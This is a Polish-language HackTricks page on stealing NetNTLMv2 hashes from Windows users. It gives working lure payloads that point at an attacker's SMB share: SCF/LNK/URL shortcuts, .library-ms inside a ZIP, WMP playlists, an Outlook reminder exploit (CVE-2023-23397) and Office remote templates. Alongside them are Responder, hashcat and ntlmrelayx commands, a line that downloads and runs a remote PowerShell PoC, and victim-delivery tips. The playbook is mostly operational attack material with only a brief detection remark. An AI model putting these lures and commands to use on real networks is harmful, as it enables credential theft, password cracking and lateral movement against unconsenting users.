# Miejsca do kradzieży danych uwierzytelniających NTLM

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od pobrania pliku microsoft word online po źródło ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Zapisywalny udział SMB + przynęty UNC wyzwalane przez Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Jeśli możesz **zapisywać dane w udziale, który użytkownicy lub zadania zaplanowane przeglądają w Explorerze**, umieść pliki, których metadata wskazuje na Twój UNC (np. `\\ATTACKER\share`). Renderowanie folderu wyzwala **niejawną autentykację SMB** i wycieka **NetNTLMv2** do Twojego listenera.<sup>[[1]](#references)</sup>

1. **Wygeneruj przynęty** (obejmuje SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/itp.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Umieść je na zapisywalnym udziale** (w dowolnym folderze, który ofiara otwiera):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Nasłuchuj i łam**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows może uzyskać dostęp do kilku plików jednocześnie; wszystko, co Explorer wyświetla w podglądzie (`BROWSE TO FOLDER`), nie wymaga żadnych kliknięć.

### Playlisty Windows Media Player (.ASX/.WAX)

Jeśli uda Ci się nakłonić cel do otwarcia lub wyświetlenia podglądu kontrolowanej przez Ciebie playlisty Windows Media Player, możesz wykraść Net‑NTLMv2, wskazując wpis na ścieżkę UNC. WMP spróbuje pobrać wskazane multimedia przez SMB i automatycznie się uwierzytelni.<sup>[[3]](#references)[[4]](#references)</sup>

Przykładowy payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Przepływ zbierania i łamania haseł:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### Osadzony w ZIP .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer niebezpiecznie obsługuje pliki .library-ms, gdy są one otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje na zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie/uruchomienie pliku .library-ms w archiwum ZIP powoduje, że Explorer wylicza zasoby UNC i wysyła uwierzytelnianie NTLM do attackera. W efekcie uzyskiwany jest NetNTLMv2, który można crackować offline lub potencjalnie relayować.<sup>[[2]](#references)</sup>

Minimalny plik .library-ms wskazujący na UNC attackera
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Utwórz plik .library-ms z powyższym XML-em (ustaw swój adres IP/hostname).
- Spakuj go do ZIP-a (w Windows: Send to → Compressed (zipped) folder) i dostarcz ZIP do celu.
- Uruchom listener do przechwytywania NTLM i poczekaj, aż ofiara otworzy plik .library-ms wewnątrz ZIP-a.


### Ścieżka dźwięku przypomnienia kalendarza Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała na ścieżkę UNC (np. \\attacker\share\alert.wav), Outlook łączył się z udziałem SMB po uruchomieniu przypomnienia, powodując leak Net-NTLMv2 użytkownika bez żadnego kliknięcia. Zostało to załatane 14 marca 2023 r., ale nadal ma duże znaczenie w przypadku starszych/niezaktualizowanych flot oraz historycznego incident response.<sup>[[5]](#references)</sup>

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Strona listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Uwagi
- Ofiara musi mieć uruchomiony Outlook dla Windows w momencie wyświetlenia przypomnienia.
- leak ujawnia Net‑NTLMv2, odpowiedni do offline cracking lub relay (nie pass-the-hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer automatycznie renderuje ikony skrótów. Nowsze badania wykazały, że nawet po kwietniowej łatce Microsoftu z 2025 r. dotyczącej skrótów z ikonami UNC nadal można było wywołać uwierzytelnianie NTLM bez żadnych kliknięć, umieszczając cel skrótu na ścieżce UNC i pozostawiając ikonę lokalnie (obejście łatki otrzymało oznaczenie CVE‑2025‑50154). Samo wyświetlenie folderu powoduje, że Explorer pobiera metadane ze zdalnego celu, wysyłając NTLM do serwera SMB atakującego.<sup>[[6]](#references)</sup>

Minimalny payload Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload skrótu programu (.lnk) za pomocą PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Pomysły na dostarczenie
- Umieść skrót w pliku ZIP i nakłoń ofiarę do jego przeglądania.
- Umieść skrót na zapisywalnym udziale, który ofiara otworzy.
- Połącz go z innymi plikami-przynętami w tym samym folderze, aby Explorer wyświetlał podgląd elementów.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows ładuje metadane `.lnk` podczas **wyświetlania/podglądu** (renderowania ikony), a nie tylko podczas uruchamiania. CVE‑2026‑25185 pokazuje ścieżkę parsowania, w której bloki **ExtraData** powodują, że powłoka rozwiązuje ścieżkę ikony i uzyskuje dostęp do systemu plików **podczas ładowania**, emitując wychodzące uwierzytelnianie NTLM, gdy ścieżka jest zdalna.

Kluczowe warunki wyzwalające (zaobserwowane w `CShellLink::_LoadFromStream`):
- Uwzględnij **DARWIN_PROPS** (`0xa0000006`) w ExtraData (warunek uruchomienia procedury aktualizacji ikony).
- Uwzględnij **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym `TargetUnicode`.
- Loader rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` na wynikowej ścieżce.

Jeśli `TargetUnicode` rozwiąże się do ścieżki UNC (np. `\\attacker\share\icon.ico`), **samo wyświetlenie folderu** zawierającego skrót powoduje wychodzące uwierzytelnianie. Ta sama ścieżka ładowania może zostać uruchomiona również przez **indeksowanie** i **skanowanie AV**, co tworzy praktyczną powierzchnię leak bez kliknięcia.<sup>[[7]](#references)</sup>

Narzędzia badawcze (parser/generator/UI) są dostępne w projekcie **LnkMeMaybe** i umożliwiają tworzenie oraz inspekcję tych struktur bez używania Windows GUI.<sup>[[8]](#references)</sup>


### Wymuszanie uwierzytelniania WebDAV / walidacja poświadczeń za pomocą davclnt.dll,DavSetCookie

Natywny **WebDAV client** może zostać wykorzystany do wymuszenia uwierzytelnienia bieżącej sesji logowania wobec dowolnego endpointu **HTTP/WebDAV**:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Dlaczego jest to przydatne:
- W przypadku **WebDAV server kontrolowanego przez attackera** może wywołać **NTLM over HTTP** bez wdrażania niestandardowego klienta.
- W przypadku **internal hosts** jest to cichy sposób na **sprawdzenie, gdzie skradzione credentials są akceptowane** przed rozpoczęciem lateral movement.<sup>[[9]](#references)</sup>
- Command stanowi dobrą alternatywę, gdy **SMB egress jest filtrowany**, ale **HTTP/WebDAV** jest nadal dostępny.

Uwagi operacyjne:
- Usługa **WebClient** musi być uruchomiona na hoście źródłowym.
- `rundll32.exe` ładuje `davclnt.dll` i powoduje, że Windows obsługuje uwierzytelnianie WebDAV przy użyciu **credentials bieżącego użytkownika**.<sup>[[10]](#references)</sup>
- Jeśli wskażesz infrastrukturę, którą kontrolujesz, użyj listenera/relay HTTP obsługującego NTLM, takiego jak:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Z perspektywy wykrywania powtarzające się wykonania `rundll32.exe davclnt.dll,DavSetCookie` wobec wielu systemów wewnętrznych są silnym sygnałem **walidacji poświadczeń / przygotowania do lateral movement przypominającego spray**, a nie normalnego zachowania użytkownika.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) do wymuszenia NTLM

Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli ustawisz dołączony szablon na ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie do SMB.

Minimalne zmiany relacji DOCX (wewnątrz word/):

1) Edytuj word/settings.xml i dodaj odwołanie do dołączonego szablonu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edytuj plik word/_rels/settings.xml.rels i skieruj rId1337 do swojego UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Przepakuj do formatu .docx i dostarcz. Uruchom listener przechwytujący SMB i oczekuj na otwarcie.

Pomysły dotyczące relaying lub abusing NTLM po przechwyceniu znajdziesz tutaj:

{{#ref}}
README.md
{{#endref}}


## Referencje
- [1] [HTB: Breach – przynęty w postaci zapisywalnych udziałów + przechwycenie przez Responder → crackowanie NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – leak uwierzytelniania przez ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — leak NTLM przez WMP → junction NTFS do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 luk NTLM: niezałatane zagrożenia eskalacją uprawnień w Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft łagodzi problem Outlook EoP (CVE‑2023‑23397) i wyjaśnia leak NTLM przez PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – zero-click, jedno NTLM: obejście poprawki bezpieczeństwa Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: przegląd CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Narzędzia TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – gdy dzwoni IT Support: analiza kampanii ModeloRAT od Teams do przejęcia domeny](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – nagłówek davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – żądanie WebDAV przez Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
